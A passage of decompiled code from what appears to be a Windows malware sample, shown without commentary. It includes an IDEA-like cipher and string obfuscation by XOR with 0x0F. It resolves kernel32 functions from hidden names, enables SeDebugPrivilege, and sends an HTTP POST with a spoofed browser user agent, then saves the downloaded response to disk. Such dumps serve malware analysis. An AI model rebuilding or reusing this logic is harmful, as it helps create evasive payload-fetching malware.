  iVar2 = 4;
  do {
    iVar6 = iVar2;
    sVar1 = local_68[iVar6];
    psVar7[1] = local_68[iVar6 + 1];
    *psVar7 = sVar1;
    uVar3 = FUN_00401000();
    sVar1 = local_68[iVar6 + 3];
    psVar7[-1] = (short)uVar3;
    psVar7[-3] = -local_68[iVar6 + 4];
    psVar7[-2] = -sVar1;
    uVar3 = FUN_00401000();
    psVar7[-4] = (short)uVar3;
    iVar5 = iVar5 + -1;
    psVar7 = psVar7 + -6;
    iVar2 = iVar6 + 6;
  } while (0 < iVar5);
  DAT_00419f82 = local_68[iVar6 + 7];
  DAT_00419f80 = local_68[iVar6 + 6];
  uVar3 = FUN_00401000();
  DAT_00419f7e = (undefined2)uVar3;
  _DAT_00419f7c = -local_68[iVar6 + 10];
  _DAT_00419f7a = -local_68[iVar6 + 9];
  uVar3 = FUN_00401000();
  DAT_00419f78 = (short)uVar3;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00401280(short *param_1)

{
  ushort *in_EAX;
  int iVar1;
  uint uVar2;
  ushort uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  ushort uVar7;
  ushort uVar8;
  short sVar9;
  uint uVar10;
  short sVar11;
  short sVar12;
  uint uVar13;
  uint uVar14;
  uint local_10;
  uint local_c;
  ushort local_8;
  
  uVar7 = *in_EAX;
  uVar8 = in_EAX[3];
  uVar10 = (uint)uVar7;
  if ((DAT_00419f78 == 0) || (uVar10 = (uint)DAT_00419f78, uVar7 == 0)) {
    uVar10 = 1 - uVar10 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f78 * (uint)uVar7;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  local_c = (uint)(ushort)(in_EAX[1] + _DAT_00419f7a);
  local_10 = (uint)DAT_00419f7e;
  if (DAT_00419f7e == 0) {
    uVar13 = 1 - uVar8 & 0xffff;
  }
  else if (uVar8 == 0) {
    uVar13 = 1 - local_10 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f7e * (uint)uVar8;
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar4 = (uint)in_EAX[2] + _DAT_00419f7c ^ uVar10;
  if (DAT_00419f80 == 0) {
    uVar4 = 1 - uVar4 & 0xffff;
  }
  else if ((short)uVar4 == 0) {
    uVar4 = 1 - DAT_00419f80 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f80 * (uVar4 & 0xffff);
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar5 = (uVar13 ^ local_c) + uVar4;
  uVar6 = uVar5 & 0xffff;
  local_10 = (uint)DAT_00419f82;
  uVar2 = uVar6;
  if ((DAT_00419f82 == 0) || (uVar2 = local_10, (short)uVar5 == 0)) {
    uVar2 = 1 - uVar2;
  }
  else {
    iVar1 = DAT_00419f82 * uVar6;
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar2 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar4 = uVar4 + (uVar2 & 0xffff);
  uVar10 = uVar10 ^ uVar2 & 0xffff;
  local_c._0_2_ = (ushort)uVar2 ^ (ushort)((uint)in_EAX[2] + _DAT_00419f7c);
  uVar13 = uVar13 ^ uVar4;
  if (DAT_00419f84 == 0) {
    uVar10 = 1 - uVar10 & 0xffff;
  }
  else if ((short)uVar10 == 0) {
    uVar10 = 1 - DAT_00419f84 & 0xffff;
  }
  else {
    iVar1 = DAT_00419f84 * uVar10;
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar7 = (ushort)local_c + _DAT_00419f86;
  uVar2 = (uVar4 ^ (ushort)(in_EAX[1] + _DAT_00419f7a)) + _DAT_00419f88;
  local_c = (uint)uVar7;
  local_10 = (uint)DAT_00419f8a;
  uVar4 = uVar13;
  if ((DAT_00419f8a == 0) || (uVar4 = local_10, (short)uVar13 == 0)) {
    uVar13 = 1 - uVar4 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f8a * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar4 = uVar2 ^ uVar10;
  if (DAT_00419f8c == 0) {
    uVar4 = 1 - uVar4 & 0xffff;
  }
  else if ((short)uVar4 == 0) {
    uVar4 = 1 - DAT_00419f8c & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f8c * (uVar4 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar6 = (uVar13 ^ local_c) + uVar4;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419f8e;
  uVar5 = uVar14;
  if ((DAT_00419f8e == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5;
  }
  else {
    iVar1 = DAT_00419f8e * uVar14;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar4 = uVar4 + (uVar5 & 0xffff);
  uVar10 = uVar10 ^ uVar5 & 0xffff;
  local_c._0_2_ = (ushort)uVar5 ^ (ushort)uVar2;
  uVar13 = uVar13 ^ uVar4;
  uVar2 = uVar10;
  if ((DAT_00419f90 == 0) || (uVar2 = (uint)DAT_00419f90, (short)uVar10 == 0)) {
    uVar2 = 1 - uVar2;
  }
  else {
    iVar1 = DAT_00419f90 * uVar10;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar2 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar8 = (ushort)local_c + _DAT_00419f92;
  uVar4 = (uVar4 ^ uVar7) + _DAT_00419f94;
  local_c = (uint)uVar8;
  local_10 = (uint)DAT_00419f96;
  uVar10 = uVar13;
  if ((DAT_00419f96 == 0) || (uVar10 = local_10, (short)uVar13 == 0)) {
    uVar10 = 1 - uVar10 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f96 * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar13 = uVar4 ^ uVar2 & 0xffff;
  if (DAT_00419f98 == 0) {
    uVar13 = 1 - uVar13 & 0xffff;
  }
  else if ((short)uVar13 == 0) {
    uVar13 = 1 - DAT_00419f98 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419f98 * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar6 = (uVar10 ^ local_c) + uVar13;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419f9a;
  uVar5 = uVar14;
  if ((DAT_00419f9a == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5;
  }
  else {
    iVar1 = DAT_00419f9a * uVar14;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar13 = uVar13 + (uVar5 & 0xffff);
  uVar2 = uVar2 & 0xffff ^ uVar5 & 0xffff;
  local_c._0_2_ = (ushort)uVar5 ^ (ushort)uVar4;
  uVar10 = uVar10 ^ uVar13;
  uVar4 = uVar2;
  if ((DAT_00419f9c == 0) || (uVar4 = (uint)DAT_00419f9c, (short)uVar2 == 0)) {
    uVar4 = 1 - uVar4;
  }
  else {
    iVar1 = DAT_00419f9c * uVar2;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar7 = (ushort)local_c + _DAT_00419f9e;
  uVar2 = (uVar13 ^ uVar8) + _DAT_00419fa0;
  local_c = (uint)uVar7;
  local_10 = (uint)DAT_00419fa2;
  uVar13 = uVar10;
  if ((DAT_00419fa2 == 0) || (uVar13 = local_10, (short)uVar10 == 0)) {
    uVar10 = 1 - uVar13 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fa2 * (uVar10 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar13 = uVar2 ^ uVar4 & 0xffff;
  if (DAT_00419fa4 == 0) {
    uVar13 = 1 - uVar13 & 0xffff;
  }
  else if ((short)uVar13 == 0) {
    uVar13 = 1 - DAT_00419fa4 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fa4 * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar6 = (uVar10 ^ local_c) + uVar13;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419fa6;
  uVar5 = uVar14;
  if ((DAT_00419fa6 == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5;
  }
  else {
    iVar1 = DAT_00419fa6 * uVar14;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar13 = uVar13 + (uVar5 & 0xffff);
  uVar6 = uVar4 & 0xffff ^ uVar5 & 0xffff;
  local_c._0_2_ = (ushort)uVar5 ^ (ushort)uVar2;
  uVar10 = uVar10 ^ uVar13;
  uVar4 = uVar6;
  if ((DAT_00419fa8 == 0) || (uVar4 = (uint)DAT_00419fa8, (short)uVar6 == 0)) {
    uVar4 = 1 - uVar4;
  }
  else {
    iVar1 = DAT_00419fa8 * uVar6;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar8 = (ushort)local_c + _DAT_00419faa;
  uVar2 = (uVar13 ^ uVar7) + _DAT_00419fac;
  local_c = (uint)uVar8;
  local_10 = (uint)DAT_00419fae;
  uVar13 = uVar10;
  if ((DAT_00419fae == 0) || (uVar13 = local_10, (short)uVar10 == 0)) {
    uVar10 = 1 - uVar13 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fae * (uVar10 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar13 = uVar2 ^ uVar4 & 0xffff;
  if (DAT_00419fb0 == 0) {
    uVar13 = 1 - uVar13 & 0xffff;
  }
  else if ((short)uVar13 == 0) {
    uVar13 = 1 - DAT_00419fb0 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fb0 * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar6 = (uVar10 ^ local_c) + uVar13;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419fb2;
  uVar5 = uVar14;
  if ((DAT_00419fb2 == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5;
  }
  else {
    iVar1 = DAT_00419fb2 * uVar14;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar13 = uVar13 + (uVar5 & 0xffff);
  uVar6 = uVar4 & 0xffff ^ uVar5 & 0xffff;
  local_c._0_2_ = (ushort)uVar5 ^ (ushort)uVar2;
  uVar10 = uVar10 ^ uVar13;
  uVar4 = uVar6;
  if ((DAT_00419fb4 == 0) || (uVar4 = (uint)DAT_00419fb4, (short)uVar6 == 0)) {
    uVar4 = 1 - uVar4;
  }
  else {
    iVar1 = DAT_00419fb4 * uVar6;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar7 = (ushort)local_c + _DAT_00419fb6;
  uVar2 = (uVar13 ^ uVar8) + _DAT_00419fb8;
  local_c = (uint)uVar7;
  local_10 = (uint)DAT_00419fba;
  uVar13 = uVar10;
  if ((DAT_00419fba == 0) || (uVar13 = local_10, (short)uVar10 == 0)) {
    uVar10 = 1 - uVar13 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fba * (uVar10 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar13 = uVar2 ^ uVar4 & 0xffff;
  if (DAT_00419fbc == 0) {
    uVar13 = 1 - uVar13 & 0xffff;
  }
  else if ((short)uVar13 == 0) {
    uVar13 = 1 - DAT_00419fbc & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fbc * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar6 = (uVar10 ^ local_c) + uVar13;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419fbe;
  uVar5 = uVar14;
  if ((DAT_00419fbe == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5;
  }
  else {
    iVar1 = DAT_00419fbe * uVar14;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar13 = uVar13 + (uVar5 & 0xffff);
  uVar6 = uVar4 & 0xffff ^ uVar5 & 0xffff;
  local_c._0_2_ = (ushort)uVar5 ^ (ushort)uVar2;
  uVar10 = uVar10 ^ uVar13;
  uVar4 = uVar6;
  if ((DAT_00419fc0 == 0) || (uVar4 = (uint)DAT_00419fc0, (short)uVar6 == 0)) {
    uVar4 = 1 - uVar4;
  }
  else {
    iVar1 = DAT_00419fc0 * uVar6;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar8 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar8 < uVar3) - uVar3) + uVar8);
  }
  uVar8 = (ushort)local_c + _DAT_00419fc2;
  uVar2 = (uVar13 ^ uVar7) + _DAT_00419fc4;
  local_c = (uint)uVar8;
  local_10 = (uint)DAT_00419fc6;
  uVar13 = uVar10;
  if ((DAT_00419fc6 == 0) || (uVar13 = local_10, (short)uVar10 == 0)) {
    uVar10 = 1 - uVar13 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fc6 * (uVar10 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar13 = uVar2 ^ uVar4 & 0xffff;
  if (DAT_00419fc8 == 0) {
    uVar13 = 1 - uVar13 & 0xffff;
  }
  else if ((short)uVar13 == 0) {
    uVar13 = 1 - DAT_00419fc8 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fc8 * (uVar13 & 0xffff);
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar6 = (uVar10 ^ local_c) + uVar13;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419fca;
  uVar5 = uVar14;
  if ((DAT_00419fca == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5;
  }
  else {
    iVar1 = DAT_00419fca * uVar14;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  uVar13 = uVar13 + (uVar5 & 0xffff);
  uVar6 = uVar4 & 0xffff ^ uVar5 & 0xffff;
  local_c._0_2_ = (ushort)uVar5 ^ (ushort)uVar2;
  uVar10 = uVar10 ^ uVar13;
  uVar4 = uVar6;
  if ((DAT_00419fcc == 0) || (uVar4 = (uint)DAT_00419fcc, (short)uVar6 == 0)) {
    uVar4 = 1 - uVar4;
  }
  else {
    iVar1 = DAT_00419fcc * uVar6;
    uVar3 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar4 = (uint)(ushort)(((uVar7 < uVar3) - uVar3) + uVar7);
  }
  local_8 = (ushort)local_c + DAT_00419fce;
  uVar2 = (uVar13 ^ uVar8) + _DAT_00419fd0;
  local_c = (uint)local_8;
  local_10 = (uint)DAT_00419fd2;
  uVar13 = uVar10;
  if ((DAT_00419fd2 == 0) || (uVar13 = local_10, (short)uVar10 == 0)) {
    uVar10 = 1 - uVar13 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fd2 * (uVar10 & 0xffff);
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar10 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar13 = uVar2 ^ uVar4 & 0xffff;
  if (DAT_00419fd4 == 0) {
    uVar13 = 1 - uVar13 & 0xffff;
  }
  else if ((short)uVar13 == 0) {
    uVar13 = 1 - DAT_00419fd4 & 0xffff;
  }
  else {
    iVar1 = (uint)DAT_00419fd4 * (uVar13 & 0xffff);
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar13 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar6 = (uVar10 ^ local_c) + uVar13;
  uVar14 = uVar6 & 0xffff;
  local_10 = (uint)DAT_00419fd6;
  uVar5 = uVar14;
  if ((DAT_00419fd6 == 0) || (uVar5 = local_10, (short)uVar6 == 0)) {
    uVar5 = 1 - uVar5 & 0xffff;
  }
  else {
    iVar1 = DAT_00419fd6 * uVar14;
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    uVar5 = (uint)(ushort)(((uVar7 < uVar8) - uVar8) + uVar7);
  }
  uVar10 = uVar10 ^ uVar13 + uVar5;
  local_8 = (ushort)(uVar13 + uVar5) ^ local_8;
  uVar13 = uVar4 & 0xffff ^ uVar5;
  uVar8 = (ushort)uVar13;
  uVar7 = uVar8;
  if ((DAT_00419fd8 == 0) || (uVar7 = DAT_00419fd8, uVar8 == 0)) {
    sVar11 = 1 - uVar7;
  }
  else {
    iVar1 = DAT_00419fd8 * uVar13;
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    sVar11 = ((uVar7 < uVar8) - uVar8) + uVar7;
  }
  local_c._0_2_ = ((ushort)uVar5 ^ (ushort)uVar2) + (short)_DAT_00419fdc;
  sVar12 = local_8 + _DAT_00419fda;
  sVar9 = (short)uVar10;
  if (DAT_00419fde == 0) {
    sVar9 = 1 - sVar9;
  }
  else if (sVar9 == 0) {
    sVar9 = 1 - DAT_00419fde;
  }
  else {
    iVar1 = (uint)DAT_00419fde * (uVar10 & 0xffff);
    uVar8 = (ushort)((uint)iVar1 >> 0x10);
    uVar7 = (ushort)iVar1;
    sVar9 = ((uVar7 < uVar8) - uVar8) + uVar7;
  }
  *param_1 = sVar11;
  param_1[1] = sVar12;
  param_1[2] = (ushort)local_c;
  param_1[3] = sVar9;
  return;
}



undefined4 __fastcall FUN_00402060(short *param_1)

{
  int in_EAX;
  int iVar1;
  
  for (iVar1 = (int)(in_EAX + (in_EAX >> 0x1f & 7U)) >> 3; iVar1 != 0; iVar1 = iVar1 + -1) {
    FUN_00401280(param_1);
    param_1 = param_1 + 4;
  }
  return 1;
}



void FUN_00402090(void)

{
  byte bVar1;
  byte *in_EAX;
  
  bVar1 = *in_EAX;
  while (bVar1 != 0) {
    *in_EAX = *in_EAX ^ 0xf;
    in_EAX = in_EAX + 1;
    bVar1 = *in_EAX;
  }
  return;
}



bool FUN_004020b0(void)

{
  BOOL BVar1;
  HANDLE ProcessHandle;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  HANDLE local_1c;
  _LUID local_18;
  _TOKEN_PRIVILEGES _Stack_10;
  
  local_1c = (HANDLE)0x0;
  TokenHandle = &local_1c;
  BVar1 = LookupPrivilegeValueA((LPCSTR)0x0,"SeDebugPrivilege",&local_18);
  if (BVar1 != 0) {
    DesiredAccess = 0xf01ff;
    ProcessHandle = GetCurrentProcess();
    BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
    if (BVar1 != 0) {
      _Stack_10.Privileges[0].Luid.LowPart = local_18.LowPart;
      _Stack_10.PrivilegeCount = 1;
      _Stack_10.Privileges[0].Luid.HighPart = local_18.HighPart;
      _Stack_10.Privileges[0].Attributes = 2;
      BVar1 = AdjustTokenPrivileges(local_1c,0,&_Stack_10,0x10,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
      return BVar1 != 0;
    }
  }
  return false;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

undefined4 __cdecl FUN_00402140(int param_1)

{
  char cVar1;
  char *pcVar2;
  uint *puVar3;
  int iVar4;
  uint *puVar5;
  HANDLE hFile;
  DWORD DVar6;
  uint *puVar7;
  int unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 local_8578;
  char acStack_8573 [7];
  uint local_856c [26];
  char local_8504 [256];
  char local_8404 [1008];
  uint auStack_8014 [2];
  uint uStack_800b;
  undefined local_8004 [32764];
  LPCSTR pCStack_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x40214a;
  pcVar2 = (char *)(param_1 + 7);
  iVar4 = (int)local_856c - (int)pcVar2;
  do {
    cVar1 = *pcVar2;
    pcVar2[iVar4] = cVar1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  puVar3 = FUN_00406820(local_856c,'/');
  if (puVar3 != (uint *)0x0) {
    puVar7 = puVar3;
    do {
      cVar1 = *(char *)puVar7;
      (local_8504 + -(int)puVar3)[(int)puVar7] = cVar1;
      puVar7 = (uint *)((int)puVar7 + 1);
    } while (cVar1 != '\0');
    *(undefined *)puVar3 = 0;
  }
  _sprintf(local_8404,
           "POST %s HTTP/1.1\r\nUser-Agent:Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nHOST: %s\r\nPragma: no-cache\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: %d\r\n\r\n%s"
           ,local_8504,local_856c,0);
  pcVar2 = local_8404;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  iVar4 = FUN_004040b0(local_8404,(int)pcVar2 - (int)(local_8404 + 1));
  if (iVar4 != 0) {
    (*DAT_0041a18c)(local_8578);
    return 1;
  }
  iVar4 = (*DAT_00419f58)(local_8578,local_8004,0x400,0);
  if (iVar4 == 0) {
    (*DAT_0041a18c)(local_8578);
    return 2;
  }
  puVar3 = FUN_00406780(&uStack_800b,"200 OK\r\n");
  if (puVar3 == &uStack_800b) {
    puVar3 = FUN_00406780(auStack_8014,"\r\nContent-Length: ");
    puVar7 = FUN_00406780(auStack_8014,"\r\nTransfer-Encoding: chunked\r\n");
    puVar5 = FUN_00406780(auStack_8014,(char *)&DAT_00415c7c);
    puVar5 = puVar5 + 1;
    if (puVar3 != (uint *)0x0) {
      unaff_EBP = FUN_004068f4((char *)((int)puVar3 + 0x12));
    }
    if (puVar7 != (uint *)0x0) {
      FID_conflict__sscanf((char *)puVar5,"%x",&stack0xffff7a7c);
      puVar5 = FUN_00406780(puVar5,(char *)&DAT_00415c88);
      puVar5 = (uint *)((int)puVar5 + 2);
    }
    hFile = CreateFileA(pCStack_8,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffff) {
      DVar6 = (int)auStack_8014 + (iVar4 - (int)puVar5);
      WriteFile(hFile,puVar5,DVar6,(LPDWORD)&stack0xffff7a80,(LPOVERLAPPED)0x0);
      for (iVar4 = unaff_EBP - DVar6; iVar4 != 0; iVar4 = iVar4 - DVar6) {
        DVar6 = (*DAT_00419f58)(unaff_ESI,auStack_8014,0x8000,0);
        WriteFile(hFile,auStack_8014,DVar6,(LPDWORD)&stack0xffff7a80,(LPOVERLAPPED)0x0);
      }
      CloseHandle(hFile);
      (*DAT_0041a18c)(unaff_ESI);
      return 0;
    }
    (*DAT_0041a18c)(unaff_ESI);
    return 4;
  }
  (*DAT_0041a18c)(local_8578);
  return 3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004023b0(void)

{
  LPCSTR pCVar1;
  HMODULE pHVar2;
  int iVar3;
  uint *puVar4;
  uint *puVar5;
  bool bVar6;
  uint local_80 [2];
  uint local_78;
  undefined2 uStack_76;
  undefined4 local_74;
  undefined4 local_70;
  undefined2 local_6c;
  HMODULE local_1c;
  int local_18;
  undefined *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00413ba0;
  local_10 = ExceptionList;
  local_14 = &stack0xffffff74;
  local_8 = 0;
  local_80[0] = 0x617d6a64;
  local_80[1] = 0x3d3c636a;
  local_78 = 0x63636b21;
  local_74 = local_74 & 0xffffff00;
  ExceptionList = &local_10;
  pCVar1 = (LPCSTR)FUN_00402090();
  pHVar2 = LoadLibraryA(pCVar1);
  if (pHVar2 != (HMODULE)0x0) {
    local_80[0] = 0x427b6a48;
    local_80[1] = 0x637a6b60;
    local_78 = 0x6366496a;
    local_74 = 0x626e416a;
    local_70 = CONCAT13(local_70._3_1_,0x4e6a);
    pCVar1 = (LPCSTR)FUN_00402090();
    DAT_0041a16c = GetProcAddress(pHVar2,pCVar1);
    bVar6 = DAT_0041a16c == (FARPROC)0x0;
    local_80[0] = 0x6a796042;
    local_80[1] = 0x6a636649;
    local_78 = 0x4e774a;
    pCVar1 = (LPCSTR)FUN_00402090();
    DAT_0041a2a8 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) || (DAT_0041a2a8 == (FARPROC)0x0)) {
      bVar6 = false;
    }
    else {
      bVar6 = true;
    }
    local_80[0] = 0x767f604c;
    local_80[1] = 0x6a636649;
    local_78 = CONCAT22(uStack_76,0x4e);
    pCVar1 = (LPCSTR)FUN_00402090();
    DAT_0041a140 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (DAT_0041a140 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x6e6a7d4c;
    local_80[1] = 0x66496a7b;
    local_78 = 0x4e6a63;
    pCVar1 = (LPCSTR)FUN_00402090();
    DAT_0041a178 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (DAT_0041a178 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x497b6a48;
    local_80[1] = 0x5c6a6366;
    local_78 = 0x6a7566;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_00419f68 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_00419f68 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x7b7d6659;
    local_80[1] = 0x4e636e7a;
    local_78 = 0x6c606363;
    local_74 = local_74 & 0xffffff00;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a148 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a148 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x7c60634c;
    local_80[1] = 0x616e476a;
    local_78 = 0x6a636b;
    pCVar1 = (LPCSTR)FUN_00402090();
    DAT_0041a024 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (DAT_0041a024 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
    }
    local_80[0] = 0x6b6e6a5d;
    local_80[1] = 0x6a636649;
    local_78 = local_78 & 0xffffff00;
    pCVar1 = (LPCSTR)FUN_00402090();
    _DAT_0041a020 = GetProcAddress(pHVar2,pCVar1);
    if ((bVar6) && (_DAT_0041a020 != (FARPROC)0x0)) {
      bVar6 = true;
    }
    else {
      bVar6 = false;
